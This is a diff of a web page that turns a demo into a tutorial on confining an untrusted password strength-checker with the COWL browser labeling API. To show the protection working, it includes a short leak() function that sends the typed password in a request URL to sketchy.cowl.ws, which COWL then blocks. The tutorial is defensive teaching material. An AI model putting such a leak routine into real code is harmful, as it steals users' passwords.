@@ -6,90 +6,368 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <title>Example: Password strength-checker</title>
   <link href="/css/bootstrap.min.css" rel="stylesheet">
+  <link href="/css/jumbotron-narrow.css" rel="stylesheet">
   <script src="/js/jquery-1.11.0.min.js"></script>
   <script src="/js/bootstrap.min.js"></script>
   <script src="http://cowl.ws/cowl.js"></script>
+  <style type="text/css">
+      .example {
+        box-shadow: 0 0 10px black
+      }
+      pre {
+        box-shadow: 0 0 2px black
+      }
+      .shadow {
+        box-shadow: 0 0 5px black
+      }
+  </style>
+  <script src="https://google-code-prettify.googlecode.com/svn/loader/run_prettify.js?skin=desert"></script>
   </head>
 
   <body>
 
   <div class="container">
-    <div class="col-lg-4">
+    <div class="col-lg-12">
+      <h3>COWL case study: password strength-checker</h3>
+      <hr/>
       <p>
-      <form id="check">
-        <div class="form-group has-feedback" id="check">
-          <label for="password">Password</label>
-          <input type="text" class="form-control" id="password">
-          <span id="response">
-          </span>
+      <div class="panel panel-info example">
+        <div class="panel-heading">Example password strength-checker
+          implementation [<a href="checker.html" target="blank">open here</a>] </div>
+        <div class="panel-body">
+        <iframe frameborder="0" class="col-lg-12"
+                src="checker.html" height="230" width="100%"></iframe>
         </div>
-        <button id="submit" type="submit" class="btn btn-default"
-                data-loading-text="checking...">check</button>
-      </form>
+      </div>
       </p>
     </div>
-    <div class="col-lg-4">
-      <blockquote>
-      <p class="small">
-      This checker loads a regular expression from <a
-        href="regex.json">here</a> to test if the password is strong
-      (or weak).  The current regular
-      expression (see <a
-        href="http://www.mkyong.com/regular-expressions/how-to-validate-password-with-regular-expression/">here</a>)
-      tests if the password has more than 6 characters, a special
-      character, a digit, and is mixed-case.
+
+    <div class="col-lg-12">
+      <p>
+      This short, informal tutorial shows how you can use the COWL API to
+      confine a library that computes on sensitive data. Specifically,
+      we are going to build a page that uses a password
+      strength-checker library. (You may find it useful to read the
+      short example explanation on the <a href="http://cowl.ws">COWL main page</a>.)
+      The running example is included above in the form of an iframe.
+      First, we are going to build the main page that has the form and
+      executes the checker, then we're going to implement the checker
+      itself.
       </p>
-      </blockquote>
+      <p>
+      To follow along you may want to browser the code <a
+        href="https://github.com/scslab/cowl.ws/tree/master/examples/checker" target="blank">on GitHub</a>.
+      </p>
+    </div>
+    <div class="col-lg-12">
+      <h4>Main page [<a href="https://github.com/scslab/cowl.ws/tree/master/examples/checker/checker.html">checker.html</a>]</h4>
+      <p>
+      The implementation of the main page is pretty straight forward.
+      We are going to use <a href="">Bootstrap</a> to make some the
+      form pretty; we're going to use <a href="">jQuery</a> to
+      simplify the form submission. Below is the markup for the
+      password form:
+      </p>
+<pre class="prettyprint lang-html">
+&lt;form id="check"&gt;
+  &lt;div class="form-group has-feedback" id="check"&gt;
+    &lt;label for="password"&gt;Password&lt;/label&gt;
+    &lt;input type="text" class="form-control" id="password" autocomplete="off"&gt;
+    &lt;span id="response"&gt;
+    &lt;/span&gt;
+  &lt;/div&gt;
+  &lt;button id="submit" type="submit" class="btn btn-default"
+          data-loading-text="checking..."&gt;check&lt;/button&gt;
+&lt;/form&gt;
+</pre>
+    <p>
+    You can safely ignore the classes if you have not used Bootstrap
+    before. Similarly, you can ignore the <var>loading-text</var> data
+    attribute -- we're going to use this to override the button's
+    text from <var>check</var> to <var>checking...</var> while the
+    worker is checker is being loaded and still computing. There are
+    only foru things that are important:
+    <ul>
+      <li>The form's id is <var>check</var>; we're going to use this to
+        register a <var>onsubmmit</var> handler that takes our password
+        and sends to to the checker.  </li>
+      <li>The password's id is <var>password</var>; we're going to use
+      this to get the element's value.</li>
+      <li>The button's id is <var>submit</var>; we're going to use
+        this to override the button's text while the checker is still
+        working.
+      <li>The form has a <var>&lt;span&gt;</var> element with id
+        <var>response</var>; we're going to insert the checker
+        response here in the form of a thumbs up or thumbs down icon,
+      respectively denoting that the password strong and weak.</li>
+    </ul>
+    </p>
+    <p>
+    Let's now actually implement the form submit handler:
+    </p>
+    <p>
+<pre class="prettyprint lang-js">
+$('#check').submit(function (event) {
+  disableForm(); // Disable form
+
+  // Get the current value typed into the password field:
+  var password = $('#password').val();
+  // Label the password, it's sensitive to the current origin:
+  password = new LabeledBlob(password, window.location.origin);
+
+  // Create new context to execute checker code in:
+  var lchecker = new LWorker("http://sketchy.cowl.ws/examples/checker/checker.js")
+
+  // Register handler to receive messages from worker:
+  lchecker.onmessage = function (data) {
+    if (data === 'ready') { // Checker is ready
+      // Send the labeled password to the checker:
+      lchecker.postMessage(password)
+    } else { // Checker send us the password strength
+      enableForm(); // Enable the form again
+      // Update our response element with icon denoting the strength:
+      if (data === 'strong') {
+        showStrongIcon();
+      } else {
+        showWeakIcon();
+      }
+    }
+  };
+
+  // Don't submit form as usual:
+  event.preventDefault();
+});
+</pre>
+    </p>
+    <p>
+    When the submit (check) button is clicked, this handler is
+    invoked. First, the handler gets the password field value and
+    labels it. The labeled password is a <var>LabeledBlob</var>:
+    the blob's label indicates the sensitivity of the data to be the current
+    origin; the protected blob content is the password itself.
+    </p>
+    <p>
+    After, the checker code is loaded into a new <var>LWorker</var>
+    context. Once it's done loading the <var>lchecker.onmessage</var>
+    handler is invoked with the <var>ready</var> message. Now, our
+    code simply sends the checker (via <var>postMessage</var>) the
+    labeled password.
+    </p>
+    <p>
+    This same handler is called with the actual password-strength
+    once the checker performs the check. However, in this case the
+    result <var>&lt;span&gt;</var> element is updated with the
+    strength indicator icon. (That's what the
+    <var>showStrongIcon</var> and <var>showWeakIcon</var> are doing.)
+    </p>
+    <p>
+    The example below shows the result executing the checker against a
+    weak password:
+    </p>
+    <p class="text-center">
+    <img class="shadow img-thumbnail" src="/images/weak.png">
+    </p>
+    <p>
+    And, a "stronger" password:
+    </p>
+    <p class="text-center">
+    <img class="shadow img-thumbnail" src="/images/strong.png">
+    </p>
+    <p>
+    That's pretty much it for the main page! All the other code is
+    boilerplate. If you are interested in, though, you can browse it
+    <a href="https://github.com/scslab/cowl.ws/tree/master/examples/checker/checker.html">here</a>.
+    </p>
+    <p>
+    Before delving into the checker code, there is one last thing that
+    is worth highlighting: if we had not labeled -- as is done in
+    today's web applications -- the password the checker could've
+    easily have leaked it. As shown below the checker can simply
+    encode the password in the query string of the request URL:
+    </p>
+    <p class="text-center">
+    <img class="shadow img-thumbnail" src="/images/steal.png">
+    </p>
+    <p>
+    Here, the last request (that returns the 404 message) leaks the
+    password to the server.  Indeed, let's now implement a checker
+    that while seemingly benign (it returns a correct result) attempts
+    to leak information below.
+    </p>
     </div>
 
-    <script>
-      $('#check').submit(function (event) {
-        toggleForm(); // disable form
-        var password = $('#password').val();
-        $('#submit').button('loading');
-        // Create context to execute checker in:
-        var lchecker = new LWorker("http://sketchy.cowl.ws/examples/checker/checker.js")
+    <div class="col-lg-12">
+      <h4>Checker [<a
+          href="https://github.com/scslab/cowl.ws/tree/master/examples/checker/checker.js">checker.js</a>]</h4>
+      <p>
+      Let's now implement the checker code. Our checker fetches a
+      regular expression to use as a way of evaluating whether the
+      password is strong or weak. An alternative approach may, for
+      example, fetch a list of common passwords, etc.
+      </p>
+      <p>
+      As a starting point, let's define a helper function that simply fetches
+      a regular expression from a remote server and calls a supplied
+      callback once the server replies:
+      </p>
+      <p>
+<pre class="prettyprint lang-js">
+function fetchRegex(cb) {
+  try {
+    var req = new XMLHttpRequest();
+    req.open('get', 'http://sketchy.cowl.ws/examples/checker/regex.json', true);
+    req.responseType = "json";
+    req.onload = function() {
+      cb(new RegExp(req.response.regex));
+    };
+    req.send();
+  } catch(e) {
+    console.warn("Failed to fetch regex: %s", e);
+    cb(/\w{6,}/);
+  }
+}
+</pre>
+      </p>
+      <p>
+      This code simply makes a request to sketchy.cowl.ws with the XHR
+      constructor. Once the server replies with JSON response, we
+      convert it to a regular expression and invoke the <var>cb</var>
+      callback. If anything fails (e.g., server is down), we simply
+      return call the callback with a default regular expression.
+      </p>
+      <p>
+      In this example, our server, when queried for
+      <var>regex.json</var>, replies back with the regex
+      from <a href="http://www.mkyong.com/regular-expressions/how-to-validate-password-with-regular-expression/">here</a>:
+      </p>
+      <p>
+<pre class="prettyprint lang-js">
+{ "regex" : "((?=.*\\d)(?=.*[a-z])(?=.*[A-Z])(?=.*[@#$%]).{6,})" }
+</pre>
+      </p>
+      <p>
+      We additionally set a <a href="https://en.wikipedia.org/wiki/Cross-origin_resource_sharing">CORS</a> header to make this resource publicly
+      readable by any script.
+      </p>
+      <p>
+      Let's now implement the code that interacts with the library
+      user (the main page):
+      </p>
+      <p>
+<pre class="prettyprint lang-js">
+// Wait for message from the parent:
+onmessage = function(password) {
+  fetchRegex(function(regex) {
+    // Raise the privacy label:
+    COWL.privacyLabel = COWL.privacyLabel.and(password.privacy);
+    // Now we can read the password
+    console.log('Checking strength of: %s', password.blob);
+    // But cannot talk to the network arbitrarily.
+    // But we can still compute the strength and reply to the parent:
+    postMessage(regex.test(password.blob) ? 'strong' : 'weak')
+  });
+};
 
-        lchecker.onmessage = function (data) {
-          if (data === 'ready') {
-            // checker is ready, send it the labeled password:
-            var lpassword = new LabeledBlob(password, window.location.origin);
-            lchecker.postMessage(lpassword)
-          } else {
-            toggleForm();
-            $('#submit').button('reset');
-            switch(data) {
-              case 'weak':
-                showWeakIcon();
-                break;
-              case 'strong':
-                showStrongIcon();
-                break;
-            }
-          }
-        };
-        event.preventDefault();
-      });
+// Tell the parent that we're done loading:
+postMessage('ready');
+</pre>
+      </p>
+      <p>
+      What is this code doing? At the top-level it registers a
+      message handler and sends a message to the parent (via
+      <var>postMessage</var>) telling it we're ready to compute the
+      strength of the password. The interesting bits are in the
+      handler.
+      </p>
+      <p>
+      In the handler, we fetch the regex, and then raise the context
+      label:
+      </p>
+      <p>
+<pre class="prettyprint lang-js">
+    // Raise the privacy label:
+    COWL.privacyLabel = COWL.privacyLabel.and(password.privacy);
+</pre>
+      </p>
+      <p>
+      The right-hand side of the assignment computes a new label that
+      corresponds to the <a href="https://en.wikipedia.org/wiki/Least-upper-bound_property">join (or greatest lower bound)</a>
+      of the current label and the label of the blob
+      (<var>password.privacy</var>). This label, when set, ensures
+      that the privacy of both the password message and everything in
+      score is protected. If we do not raise the context label as
+      such, COWL would prevent the code from looking at the blob
+      contents. In particular, we would not be able to print out the
+      password to the console. COWL would throw the following
+      exception:
+      </p>
+      <p class="text-center">
+      <img class="shadow img-thumbnail" src="/images/noraise.png">
+      </p>
+      <p>
+      Raising the label as such, however, allows us to inspect the
+      password message content (the <var>blob</var> property), test
+      it against the regex, and reply to the parent with either
+      <var>'strong'</var> or <var>'weak'</var>.
+      </p>
+      <p>
+      Of course, that's not the whole story! Raising the label also
+      prevents the code from communicating arbitrarily (since now it
+      can look at more sensitive data, the password). Hence, for
+      example, if we try to send the password content, COWL prevents
+      the leak. Let's actually modify the <var>onmessage</var> handler
+      to leak the password:
+      </p>
+      <p>
+<pre class="prettyprint lang-js">
+...
+    // Now we can read the password
+    console.log('Checking strength of: %s', password.blob);
+    // But cannot talk to the network arbitrarily.
+    // Let's try:
+    leak(password.blob);
+...
+</pre>
+      </p>
+      <p>
+      Where the helper <var>leak</var> function is defined as:
+      </p>
+      <p>
+<pre class="prettyprint lang-js">
+function leak(pass) {
+  try {
+    var req = new XMLHttpRequest();
+    req.open('get', 'http://sketchy.cowl.ws/leak/yourpass='+pass, true);
+    req.send();
+  } catch(e) {
+    console.log("Failed to leak!");
+  }
+}
+</pre>
+      </p>
+      <p>
+      Running this code and looking at the network profiler, we see
+      the block and no request being made to <var>sketchy.cowl.ws</var>:
+      </p>
+      <p class="text-center">
+      <img class="shadow img-thumbnail" src="/images/block.png">
+      </p>
+      <p>
+      This is great! Despite being malicious, we were able to use this
+      strength checker. Of course, you can imagine a less contrived
+      example where the library you are trying to use is accidentally
+      leaking data to the author's remote server.
+      </p>
+      <p>
+      One last final note: in the above screen-shot you may have
+      noticed that the security error is a "Content Security Policy"
+      violation. This is because COWL piggy-backs on the existing CSP
+      implementation. Indeed, the raising of the label amounted to
+      changing the context's CSP to a more restricting rule. Checkout
+      the <a href=""http://www.scs.stanford.edu/~deian/pubs/stefan:2014:protecting.pdf">paper</a> for mored details!
+      </p>
 
-      function toggleForm() {
-        var pElem = document.getElementById('password');
-        pElem.disabled = !pElem.disabled;
-        var sElem = document.getElementById('submit');
-        sElem.disabled = !sElem.disabled;
-      }
-
-      function showWeakIcon() {
-        $('#check').removeClass('has-success');
-        $('#check').addClass('has-error');
-        $('#response').html('<span class="glyphicon glyphicon-thumbs-down form-control-feedback"></span>')
-      }
-
-      function showStrongIcon() {
-        $('#check').removeClass('has-error');
-        $('#check').addClass('has-success');
-        $('#response').html('<span class="glyphicon glyphicon-thumbs-up form-control-feedback"></span>')
-      }
-    </script>
+    </div>
   </div>
   </body>
 </html>
